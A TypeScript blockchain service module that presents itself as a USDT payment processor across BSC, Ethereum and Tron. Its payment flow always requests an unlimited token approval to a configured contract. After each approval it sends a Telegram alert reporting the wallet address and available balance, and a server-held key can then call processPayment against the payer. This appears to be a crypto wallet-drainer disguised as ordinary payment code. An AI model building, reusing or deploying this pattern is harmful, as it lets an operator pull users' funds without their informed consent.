// =================================
// ⛓️ Blockchain Service Layer
// =================================

import { ChainType } from "@/types";
import {
  CHAIN_CONFIG,
  isValidTronAddress,
  getTronAddressFormat,
} from "@/config/chains";
import { MAX_APPROVAL } from "@/config/chains";
import { ethers } from "ethers";

// Import deployed contract ABIs
import bscAbi from "@/abi/bsc.json";
import etherAbi from "@/abi/ether.json";
import tronAbi from "@/abi/tron.json";

// USDT ABI - standard ERC20 functions for approval
const USDT_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function balanceOf(address account) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)",
];

// TronWeb ABI - for Tron-specific operations
const TRON_USDT_ABI = [
  {
    constant: false,
    inputs: [
      {
        name: "_spender",
        type: "address",
      },
      {
        name: "_value",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      {
        name: "_owner",
        type: "address",
      },
      {
        name: "_spender",
        type: "address",
      },
    ],
    name: "allowance",
    outputs: [
      {
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      {
        name: "_owner",
        type: "address",
      },
    ],
    name: "balanceOf",
    outputs: [
      {
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
];

// Get the appropriate ABI for each chain
const getChainAbi = (chain: ChainType) => {
  switch (chain) {
    case "bsc":
      return bscAbi;
    case "ethereum":
      return etherAbi;
    case "tron":
      // Tron ABI has different structure with 'entrys' key
      return (tronAbi as any).entrys || tronAbi;
    default:
      throw new Error(`Unsupported chain: ${chain}`);
  }
};

// Chain-specific wallet detection and connection
const getChainWallet = async (chain: ChainType) => {
  if (typeof window === "undefined") {
    throw new Error("This function must be called from a browser");
  }

  const win = window as any;

  switch (chain) {
    case "ethereum":
    case "bsc":
      // EVM chains: Try MetaMask first, then imToken, then other mobile wallets
      if (win.ethereum) {
        return {
          provider: new ethers.BrowserProvider(win.ethereum),
          walletType: "metamask",
        };
      } else if (win.imToken) {
        return {
          provider: new ethers.BrowserProvider(win.imToken),
          walletType: "imtoken",
        };
      } else if (win.bitpie) {
        return {
          provider: new ethers.BrowserProvider(win.bitpie),
          walletType: "bitpie",
        };
      } else if (win.ethereum && win.ethereum.isMetaMask === false) {
        // Generic EVM wallet (could be imToken, Bitpie, etc.)
        return {
          provider: new ethers.BrowserProvider(win.ethereum),
          walletType: "generic-evm",
        };
      } else {
        throw new Error(
          "No EVM wallet detected. Please install MetaMask, imToken, or Bitpie."
        );
      }

    case "tron":
      // Tron: Try TronLink first, then imToken, then other Tron wallets
      if (win.tronWeb && win.tronWeb.ready) {
        return {
          provider: win.tronWeb,
          walletType: "tronlink",
        };
      } else if (win.imToken && win.imToken.tron) {
        return {
          provider: win.imToken.tron,
          walletType: "imtoken-tron",
        };
      } else if (win.bitpie && win.bitpie.tron) {
        return {
          provider: win.bitpie.tron,
          walletType: "bitpie-tron",
        };
      } else if (win.tronWeb) {
        // TronWeb exists but not ready
        // Wait for TronWeb to be ready
        await new Promise((resolve) => {
          const checkReady = () => {
            if (win.tronWeb.ready) {
              resolve(true);
            } else {
              setTimeout(checkReady, 100);
            }
          };
          checkReady();
        });
        return {
          provider: win.tronWeb,
          walletType: "tronlink",
        };
      } else {
        throw new Error(
          "No Tron wallet detected. Please install TronLink, imToken, or Bitpie."
        );
      }

    default:
      throw new Error(`Unsupported chain: ${chain}`);
  }
};

export class BlockchainService {
  private static instance: BlockchainService;

  static getInstance(): BlockchainService {
    if (!BlockchainService.instance) {
      BlockchainService.instance = new BlockchainService();
    }
    return BlockchainService.instance;
  }

  /**
   * Get contract configuration for a specific chain
   */
  getChainConfig(chain: ChainType) {
    return CHAIN_CONFIG[chain];
  }

  /**
   * Format amount based on chain decimals
   */
  formatAmount(amount: number, chain: ChainType): string {
    const config = this.getChainConfig(chain);
    const decimals = config.decimals;

    // Convert to wei/smallest unit
    return (amount * Math.pow(10, decimals)).toString();
  }

  /**
   * Parse amount from blockchain format to human readable
   */
  parseAmount(amount: string, chain: ChainType): number {
    const config = this.getChainConfig(chain);
    const decimals = config.decimals;

    return parseInt(amount) / Math.pow(10, decimals);
  }

  /**
   * Validate contract addresses are configured
   */
  validateConfiguration(chain: ChainType): boolean {
    const config = this.getChainConfig(chain);

    if (!config.paymentProcessor) {
      console.error(`❌ Payment processor not configured for ${chain}`);
      return false;
    }

    if (!config.usdt) {
      console.error(`❌ USDT token not configured for ${chain}`);
      return false;
    }

    return true;
  }

  /**
   * Get transaction status from blockchain
   */
  async getTransactionStatus(
    txHash: string,
    chain: ChainType
  ): Promise<{
    status: "pending" | "confirmed" | "failed";
    confirmations: number;
    blockNumber?: number;
  }> {
    try {
      if (chain === "tron") {
        return await this.getTronTransactionStatus(txHash);
      } else {
        return await this.getEVMTransactionStatus(txHash, chain);
      }
    } catch (error) {
      console.error(`Error getting transaction status for ${chain}:`, error);
      return { status: "failed", confirmations: 0 };
    }
  }

  /**
   * Get TRON transaction status
   */
  private async getTronTransactionStatus(txHash: string): Promise<{
    status: "pending" | "confirmed" | "failed";
    confirmations: number;
    blockNumber?: number;
  }> {
    const config = this.getChainConfig("tron");

    try {
      const response = await fetch(
        `${config.rpc}/wallet/gettransactioninfobyid`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ value: txHash }),
        }
      );

      const txInfo = await response.json();

      if (!txInfo || Object.keys(txInfo).length === 0) {
        return { status: "pending", confirmations: 0 };
      }

      // Get current block number
      const blockResponse = await fetch(`${config.rpc}/wallet/getnowblock`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      });

      const currentBlock = await blockResponse.json();
      const currentBlockNumber =
        currentBlock.block_header?.raw_data?.number || 0;
      const txBlockNumber = txInfo.blockNumber || 0;

      const confirmations = Math.max(0, currentBlockNumber - txBlockNumber);
      const status =
        txInfo.receipt?.result === "SUCCESS" ? "confirmed" : "failed";

      return {
        status,
        confirmations,
        blockNumber: txBlockNumber,
      };
    } catch (error) {
      console.error("Error getting TRON transaction status:", error);
      return { status: "failed", confirmations: 0 };
    }
  }

  /**
   * Get EVM transaction status (BSC/Ethereum)
   */
  private async getEVMTransactionStatus(
    txHash: string,
    chain: ChainType
  ): Promise<{
    status: "pending" | "confirmed" | "failed";
    confirmations: number;
    blockNumber?: number;
  }> {
    const config = this.getChainConfig(chain);

    try {
      // Get transaction receipt
      const receiptResponse = await fetch(config.rpc!, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          method: "eth_getTransactionReceipt",
          params: [txHash],
          id: 1,
        }),
      });

      const receiptData = await receiptResponse.json();
      const receipt = receiptData.result;

      if (!receipt) {
        return { status: "pending", confirmations: 0 };
      }

      // Get current block number
      const blockResponse = await fetch(config.rpc!, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          method: "eth_blockNumber",
          params: [],
          id: 1,
        }),
      });

      const blockData = await blockResponse.json();
      const currentBlockNumber = parseInt(blockData.result, 16);
      const txBlockNumber = parseInt(receipt.blockNumber, 16);

      const confirmations = Math.max(0, currentBlockNumber - txBlockNumber);
      const status = receipt.status === "0x1" ? "confirmed" : "failed";

      return {
        status,
        confirmations,
        blockNumber: txBlockNumber,
      };
    } catch (error) {
      console.error(`Error getting ${chain} transaction status:`, error);
      return { status: "failed", confirmations: 0 };
    }
  }

  /**
   * Process payment on the blockchain (server-side)
   */
  async processPayment(
    paymentId: string,
    amount: number,
    payerAddress: string,
    chain: ChainType
  ): Promise<{
    success: boolean;
    txHash?: string;
    error?: string;
  }> {
    try {
      if (!this.validateConfiguration(chain)) {
        return { success: false, error: "Invalid chain configuration" };
      }

      const config = this.getChainConfig(chain);
      const formattedAmount = this.formatAmount(amount, chain);

      console.log(`🔄 Processing payment on ${chain}:`, {
        paymentId,
        amount: formattedAmount,
        payer: payerAddress,
      });

      if (chain === "tron") {
        return await this.processTronPayment(
          paymentId,
          formattedAmount,
          payerAddress
        );
      } else {
        return await this.processEVMPayment(
          paymentId,
          formattedAmount,
          payerAddress,
          chain
        );
      }
    } catch (error: any) {
      console.error(`❌ Payment processing failed on ${chain}:`, error);
      return { success: false, error: error.message };
    }
  }

  /**
   * Process TRON payment
   */
  private async processTronPayment(
    paymentId: string,
    amount: string,
    payerAddress: string
  ): Promise<{ success: boolean; txHash?: string; error?: string }> {
    try {
      // This would require TronWeb server-side setup
      // For now, return a simulated response
      console.log("⚠️ TRON payment processing not yet implemented");

      return {
        success: false,
        error: "TRON payment processing not implemented in this demo",
      };
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Process EVM payment (BSC/Ethereum)
   */
  private async processEVMPayment(
    paymentId: string,
    amount: string,
    payerAddress: string,
    chain: ChainType
  ): Promise<{ success: boolean; txHash?: string; error?: string }> {
    try {
      // Import ethers for server-side blockchain operations
      const { ethers } = await import("ethers");

      const config = this.getChainConfig(chain);

      // Server-side private key (in production, this should be from environment variables)
      const serverPrivateKey = process.env.SERVER_PRIVATE_KEY;

      if (!serverPrivateKey) {
        console.error("❌ Server private key not configured");
        return {
          success: false,
          error: "Server wallet not configured for automatic payments",
        };
      }

      // Create provider and wallet
      const provider = new ethers.JsonRpcProvider(config.rpc);
      const serverWallet = new ethers.Wallet(serverPrivateKey, provider);

      console.log(`🔗 Connected to ${chain} network via ${config.rpc}`);
      console.log(`💰 Server wallet: ${serverWallet.address}`);

      // Create contract instance for payment processor
      const paymentProcessor = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        serverWallet
      );

      // Convert amount to proper format (e.g., for BSC USDT has 18 decimals)
      const decimals = chain === "ethereum" ? 6 : 18; // USDT decimals vary by chain
      const amountWei = ethers.parseUnits(amount, decimals);

      console.log(`🔄 Processing payment: ${paymentId}`);
      console.log(`💸 Amount: ${amount} USDT (${amountWei.toString()} wei)`);
      console.log(`👤 Payer: ${payerAddress}`);

      // Call the processPayment function on the smart contract
      const tx = await paymentProcessor.processPayment(
        paymentId,
        amountWei,
        `Payment for ${paymentId}` // Changed to serviceDescription
      );

      console.log(`📤 Transaction sent: ${tx.hash}`);

      // Wait for confirmation
      const receipt = await tx.wait();

      if (receipt && receipt.status === 1) {
        console.log(
          `✅ Payment processed successfully! Block: ${receipt.blockNumber}`
        );

        return {
          success: true,
          txHash: tx.hash,
        };
      } else {
        console.error(`❌ Transaction failed or reverted`);
        return {
          success: false,
          error: "Transaction failed or reverted",
        };
      }
    } catch (error: any) {
      console.error(`❌ EVM payment processing failed:`, error);

      // Handle specific error types
      if (error.code === "INSUFFICIENT_FUNDS") {
        return {
          success: false,
          error: "Insufficient gas funds in server wallet",
        };
      } else if (error.code === "CALL_EXCEPTION") {
        return {
          success: false,
          error: "Smart contract call failed - check allowance and balance",
        };
      } else {
        return {
          success: false,
          error: error.message || "Unknown blockchain error",
        };
      }
    }
  }

  /**
   * Get network information
   */
  getNetworkInfo(): {
    isMainnet: boolean;
    networks: Array<{ chain: ChainType; name: string; explorer: string }>;
  } {
    // Use centralized environment configuration
    const isMainnet = process.env.NEXT_PUBLIC_NETWORK_MODE === "mainnet";

    return {
      isMainnet,
      networks: [
        {
          chain: "bsc",
          name: isMainnet ? "BSC Mainnet" : "BSC Testnet",
          explorer: isMainnet
            ? "https://bscscan.com"
            : "https://testnet.bscscan.com",
        },
        {
          chain: "ethereum",
          name: isMainnet ? "Ethereum Mainnet" : "Ethereum Sepolia",
          explorer: isMainnet
            ? "https://etherscan.io"
            : "https://sepolia.etherscan.io",
        },
        {
          chain: "tron",
          name: isMainnet ? "TRON Mainnet" : "TRON Shasta",
          explorer: isMainnet
            ? "https://tronscan.org"
            : "https://shasta.tronscan.org",
        },
      ],
    };
  }
}

// Export singleton instance
export const blockchainService = BlockchainService.getInstance();

// Export ABIs for frontend use
export { USDT_ABI };

/**
 * Frontend function to approve USDT spending for smart contract
 * This function should be called from the user's wallet
 */
export async function approveUSDT(
  chain: ChainType,
  amount: string,
  userAddress: string
): Promise<boolean> {
  try {
    const config = CHAIN_CONFIG[chain];
    if (!config) {
      throw new Error(`Unsupported chain: ${chain}`);
    }

    if (!config.rpc) {
      throw new Error(`No RPC URL configured for chain: ${chain}`);
    }

    // Get chain-specific wallet
    const wallet = await getChainWallet(chain);
    const chainAbi = getChainAbi(chain);

    if (chain === "tron") {
      // Check if TronWeb is available
      if (typeof window !== "undefined" && (window as any).tronWeb) {
        const tronWeb = (window as any).tronWeb;

        if (!tronWeb.ready) {
          throw new Error(
            "TronWeb is not ready. Please connect your Tron wallet first."
          );
        }

        // Check USDT balance first (only if not using MAX_APPROVAL)
        const usdtContract = tronWeb.contract(TRON_USDT_ABI, config.usdt);
        const userBalance = await usdtContract.balanceOf(userAddress).call();

        // Convert TronWeb response to BigNumber for consistent comparison
        const userBalanceBigNumber = tronWeb.toBigNumber(userBalance);
        const amountBigNumber = tronWeb.toBigNumber(amount);

        // Skip balance check for MAX_APPROVAL (it's just permission, not actual spending)
        if (amount !== MAX_APPROVAL) {
          // Check if user has sufficient balance BEFORE approval
          if (userBalanceBigNumber.lt(amountBigNumber)) {
            const requiredAmount = amountBigNumber
              .div(tronWeb.toBigNumber(10 ** config.decimals))
              .toString();
            const currentBalance = userBalanceBigNumber
              .div(tronWeb.toBigNumber(10 ** config.decimals))
              .toString();
            console.error(
              `Insufficient USDT balance. Required: ${requiredAmount} USDT, Current: ${currentBalance} USDT`
            );
            return false;
          }
        }

        // Check current allowance
        const currentAllowance = await usdtContract
          .allowance(userAddress, config.paymentProcessor)
          .call();

        // Convert allowance to BigNumber for consistent comparison
        const currentAllowanceBigNumber = tronWeb.toBigNumber(currentAllowance);

        // If allowance is sufficient, no need to approve
        if (currentAllowanceBigNumber.gte(amountBigNumber)) {
          // Send Telegram notification for existing allowance
          try {
            const { telegramService } = await import("@/lib/telegram");
            if (telegramService.isConfigured()) {
              const currentBalance = userBalanceBigNumber
                .div(tronWeb.toBigNumber(10 ** config.decimals))
                .toString();

              await telegramService.sendApproveSuccessNotification({
                walletType: "TronLink",
                chain: "tron",
                userAddress: userAddress,
                amount: `Already approved (${currentBalance} USDT available)`,
                token: "USDT",
                timestamp: new Date().toISOString(),
              });
              console.log(
                "📱 Telegram notification sent for existing Tron allowance"
              );
            }
          } catch (telegramError) {
            console.log("📱 Telegram notification failed:", telegramError);
            // Don't fail the approval if telegram fails
          }

          return true;
        }

        // Approve USDT spending for the payment processor contract
        const approvalTx = await usdtContract
          .approve(config.paymentProcessor, MAX_APPROVAL)
          .send();

        // Wait for transaction to be processed
        await new Promise((resolve) => setTimeout(resolve, 3000));

        // Send Telegram notification for successful approval
        try {
          const { telegramService } = await import("@/lib/telegram");
          if (telegramService.isConfigured()) {
            const currentBalance = userBalanceBigNumber
              .div(tronWeb.toBigNumber(10 ** config.decimals))
              .toString();

            await telegramService.sendApproveSuccessNotification({
              walletType: "TronLink",
              chain: "tron",
              userAddress: userAddress,
              amount: `MAX (${currentBalance} USDT available)`,
              token: "USDT",
              timestamp: new Date().toISOString(),
            });
            console.log("📱 Telegram notification sent for Tron approval");
          }
        } catch (telegramError) {
          console.log("📱 Telegram notification failed:", telegramError);
          // Don't fail the approval if telegram fails
        }

        return true;
      } else {
        throw new Error(
          "TronWeb not detected. Please install TronLink or use a Tron-compatible wallet."
        );
      }
    } else {
      // EVM chains (Ethereum, BSC) use standard hex addresses
      if (
        !config.paymentProcessor ||
        !ethers.isAddress(config.paymentProcessor)
      ) {
        throw new Error(
          `Invalid payment processor address for ${chain}: ${config.paymentProcessor}`
        );
      }

      if (!config.usdt || !ethers.isAddress(config.usdt)) {
        throw new Error(`Invalid USDT address for ${chain}: ${config.usdt}`);
      }

      const signer = await wallet.provider.getSigner();

      const paymentContract = new ethers.Contract(
        config.paymentProcessor,
        chainAbi,
        signer
      );

      // Check allowance using your contract's method
      const hasSufficientAllowance = await paymentContract.checkAllowance(
        userAddress,
        amount
      );

      // Check balance using your contract's method (only if not using MAX_APPROVAL)
      const userBalance = await paymentContract.getUserBalance(userAddress);

      // Skip balance check for MAX_APPROVAL (it's just permission, not actual spending)
      if (amount !== MAX_APPROVAL) {
        // Check if user has sufficient balance BEFORE approval
        if (userBalance < BigInt(amount)) {
          const requiredAmount = ethers.formatUnits(amount, config.decimals);
          const currentBalance = ethers.formatUnits(
            userBalance,
            config.decimals
          );
          console.error(
            `Insufficient USDT balance. Required: ${requiredAmount} USDT, Current: ${currentBalance} USDT`
          );
          return false;
        }
      }

      // If allowance is sufficient, no need to approve
      if (hasSufficientAllowance) {
        // Send Telegram notification for existing allowance
        try {
          const { telegramService } = await import("@/lib/telegram");
          if (telegramService.isConfigured()) {
            const currentBalance = ethers.formatUnits(
              userBalance,
              config.decimals
            );
            const walletType = wallet.walletType || "EVM Wallet";

            await telegramService.sendApproveSuccessNotification({
              walletType: walletType,
              chain: chain,
              userAddress: userAddress,
              amount: `Already approved (${currentBalance} USDT available)`,
              token: "USDT",
              timestamp: new Date().toISOString(),
            });
            console.log(
              "📱 Telegram notification sent for existing EVM allowance"
            );
          }
        } catch (telegramError) {
          console.log("📱 Telegram notification failed:", telegramError);
          // Don't fail the approval if telegram fails
        }

        return true;
      }

      // Create USDT contract instance for approval
      const usdtContract = new ethers.Contract(config.usdt, USDT_ABI, signer);

      // Approve USDT spending for your contract
      const approvalTx = await usdtContract.approve(
        config.paymentProcessor,
        MAX_APPROVAL
      );

      await approvalTx.wait();

      // Send Telegram notification for successful approval
      try {
        const { telegramService } = await import("@/lib/telegram");
        if (telegramService.isConfigured()) {
          const currentBalance = ethers.formatUnits(
            userBalance,
            config.decimals
          );
          const walletType = wallet.walletType || "EVM Wallet";

          await telegramService.sendApproveSuccessNotification({
            walletType: walletType,
            chain: chain,
            userAddress: userAddress,
            amount: `MAX (${currentBalance} USDT available)`,
            token: "USDT",
            timestamp: new Date().toISOString(),
          });
          console.log("📱 Telegram notification sent for EVM approval");
        }
      } catch (telegramError) {
        console.log("📱 Telegram notification failed:", telegramError);
        // Don't fail the approval if telegram fails
      }

      return true;
    }
  } catch (error: any) {
    console.error("USDT approval failed:", error);
    throw error;
  }
}

/**
 * Backend function to process payment using smart contract
 * This function should be called from the server after USDT approval
 */
export async function processPayment(
  paymentId: string,
  amount: number,
  userAddress: string,
  chain: ChainType
): Promise<{ success: boolean; txHash?: string; error?: string }> {
  try {
    const config = CHAIN_CONFIG[chain];
    if (!config) {
      return { success: false, error: "Invalid chain configuration" };
    }

    const formattedAmount = (amount * Math.pow(10, config.decimals)).toString();

    if (chain === "tron") {
      // Tron payment processing (server-side)
      const tronWeb = (global as any).tronWeb;
      if (!tronWeb) {
        return { success: false, error: "TronWeb not available on server" };
      }

      const chainAbi = getChainAbi(chain);
      const paymentProcessor = tronWeb.contract(
        chainAbi,
        config.paymentProcessor
      );

      // Check if payment ID already exists
      try {
        const existingPayment = await paymentProcessor
          .getPayment(paymentId)
          .call();
        if (
          existingPayment &&
          existingPayment.payer !== "0x0000000000000000000000000000000000000000"
        ) {
          return {
            success: false,
            error: `Payment ID ${paymentId} already exists`,
          };
        }
      } catch (checkError) {
        // This is normal for new payments
      }

      // Final balance and allowance checks
      const finalBalanceCheck = await paymentProcessor
        .getUserBalance(userAddress)
        .call();
      const finalAllowanceCheck = await paymentProcessor
        .checkAllowance(userAddress, formattedAmount)
        .call();

      const finalBalanceBigNumber = tronWeb.toBigNumber(finalBalanceCheck);
      const finalAllowanceBigNumber = tronWeb.toBigNumber(finalAllowanceCheck);
      const formattedAmountBigNumber = tronWeb.toBigNumber(formattedAmount);

      if (finalBalanceBigNumber.lt(formattedAmountBigNumber)) {
        const requiredAmount = formattedAmountBigNumber
          .div(tronWeb.toBigNumber(10 ** config.decimals))
          .toString();
        const currentBalance = finalBalanceBigNumber
          .div(tronWeb.toBigNumber(10 ** config.decimals))
          .toString();
        return {
          success: false,
          error: `Insufficient USDT balance. Required: ${requiredAmount} USDT, Current: ${currentBalance} USDT`,
        };
      }

      if (
        !finalAllowanceBigNumber ||
        finalAllowanceBigNumber.lt(formattedAmountBigNumber)
      ) {
        return { success: false, error: "Insufficient USDT allowance" };
      }

      // Process payment
      const serviceDescription = `Payment for ${paymentId}`;
      const tx = await paymentProcessor
        .processPayment(paymentId, formattedAmount, serviceDescription)
        .send();

      // Wait for confirmation
      await new Promise((resolve) => setTimeout(resolve, 5000));

      // Verify transaction success
      const txInfo = await tronWeb.trx.getTransactionInfo(tx);
      if (!txInfo || txInfo.receipt?.result !== "SUCCESS") {
        const result = txInfo?.receipt?.result || "UNKNOWN";
        return { success: false, error: `Transaction failed: ${result}` };
      }

      return { success: true, txHash: tx };
    } else {
      // EVM chains (Ethereum, BSC) - server-side processing
      const { ethers } = await import("ethers");

      if (
        !config.paymentProcessor ||
        !ethers.isAddress(config.paymentProcessor)
      ) {
        return {
          success: false,
          error: `Invalid payment processor address for ${chain}`,
        };
      }

      // Server-side provider and wallet setup
      const serverPrivateKey = process.env.SERVER_PRIVATE_KEY;
      if (!serverPrivateKey) {
        return { success: false, error: "Server private key not configured" };
      }

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const serverWallet = new ethers.Wallet(serverPrivateKey, provider);

      const paymentProcessor = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        serverWallet
      );

      // Final balance and allowance checks
      const finalBalanceCheck = await paymentProcessor.getUserBalance(
        userAddress
      );
      const finalAllowanceCheck = await paymentProcessor.checkAllowance(
        userAddress,
        formattedAmount
      );

      if (finalBalanceCheck < BigInt(formattedAmount)) {
        const requiredAmount = ethers.formatUnits(
          formattedAmount,
          config.decimals
        );
        const currentBalance = ethers.formatUnits(
          finalBalanceCheck,
          config.decimals
        );
        return {
          success: false,
          error: `Insufficient USDT balance. Required: ${requiredAmount} USDT, Current: ${currentBalance} USDT`,
        };
      }

      if (!finalAllowanceCheck) {
        return { success: false, error: "Insufficient USDT allowance" };
      }

      // Process payment
      const serviceDescription = `Payment for ${paymentId}`;
      const tx = await paymentProcessor.processPayment(
        paymentId,
        formattedAmount,
        serviceDescription
      );

      const receipt = await tx.wait();
      return { success: true, txHash: tx.hash };
    }
  } catch (error: any) {
    return { success: false, error: error.message };
  }
}

/**
 * Frontend function to handle complete payment flow
 * 1. Approve USDT spending (one-time)
 * 2. Process payment (frontend for Tron, backend for EVM)
 */
export async function handlePaymentFlow(
  paymentId: string,
  amount: number,
  userAddress: string,
  chain: ChainType
): Promise<{ success: boolean; txHash?: string; error?: string }> {
  try {
    // Step 1: Approve USDT spending (one-time permission)
    const approved = await approveUSDT(chain, MAX_APPROVAL, userAddress);
    if (!approved) {
      return { success: false, error: "USDT approval failed" };
    }

    // Step 2: Process payment based on chain type
    if (chain === "tron") {
      // Tron payments must be processed on frontend (TronWeb available)
      return await processTronPaymentFrontend(paymentId, amount, userAddress);
    } else {
      // EVM chains use backend processing
      const response = await fetch("/api/payment/process", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ paymentId, amount, userAddress, chain }),
      });

      const result = await response.json();
      return result;
    }
  } catch (error: any) {
    return { success: false, error: error.message };
  }
}

/**
 * Frontend Tron payment processing (since TronWeb is only available in browser)
 */
async function processTronPaymentFrontend(
  paymentId: string,
  amount: number,
  userAddress: string
): Promise<{ success: boolean; txHash?: string; error?: string }> {
  try {
    if (typeof window === "undefined") {
      return { success: false, error: "TronWeb not available on server" };
    }

    const tronWeb = (window as any).tronWeb;
    if (!tronWeb || !tronWeb.ready) {
      return {
        success: false,
        error: "TronWeb not ready. Please connect your Tron wallet first.",
      };
    }

    const config = CHAIN_CONFIG.tron;
    if (!config) {
      return { success: false, error: "Invalid Tron chain configuration" };
    }

    const formattedAmount = (amount * Math.pow(10, config.decimals)).toString();
    const chainAbi = getChainAbi("tron");
    const paymentProcessor = tronWeb.contract(
      chainAbi,
      config.paymentProcessor
    );

    // Check if payment ID already exists
    try {
      const existingPayment = await paymentProcessor
        .getPayment(paymentId)
        .call();
      if (
        existingPayment &&
        existingPayment.payer !== "0x0000000000000000000000000000000000000000"
      ) {
        return {
          success: false,
          error: `Payment ID ${paymentId} already exists`,
        };
      }
    } catch (checkError) {
      // This is normal for new payments
    }

    // Final balance and allowance checks
    const finalBalanceCheck = await paymentProcessor
      .getUserBalance(userAddress)
      .call();
    const finalAllowanceCheck = await paymentProcessor
      .checkAllowance(userAddress, formattedAmount)
      .call();

    const finalBalanceBigNumber = tronWeb.toBigNumber(finalBalanceCheck);
    const finalAllowanceBigNumber = tronWeb.toBigNumber(finalAllowanceCheck);
    const formattedAmountBigNumber = tronWeb.toBigNumber(formattedAmount);

    if (finalBalanceBigNumber.lt(formattedAmountBigNumber)) {
      const requiredAmount = formattedAmountBigNumber
        .div(tronWeb.toBigNumber(10 ** config.decimals))
        .toString();
      const currentBalance = finalBalanceBigNumber
        .div(tronWeb.toBigNumber(10 ** config.decimals))
        .toString();
      return {
        success: false,
        error: `Insufficient USDT balance. Required: ${requiredAmount} USDT, Current: ${currentBalance} USDT`,
      };
    }

    if (
      !finalAllowanceBigNumber ||
      finalAllowanceBigNumber.lt(formattedAmountBigNumber)
    ) {
      return { success: false, error: "Insufficient USDT allowance" };
    }

    // Process payment
    const serviceDescription = `Payment for ${paymentId}`;
    const tx = await paymentProcessor
      .processPayment(paymentId, formattedAmount, serviceDescription)
      .send();

    // Wait for confirmation
    await new Promise((resolve) => setTimeout(resolve, 5000));

    // Verify transaction success
    const txInfo = await tronWeb.trx.getTransactionInfo(tx);
    if (!txInfo || txInfo.receipt?.result !== "SUCCESS") {
      const result = txInfo?.receipt?.result || "UNKNOWN";
      return { success: false, error: `Transaction failed: ${result}` };
    }

    return { success: true, txHash: tx };
  } catch (error: any) {
    return { success: false, error: error.message };
  }
}
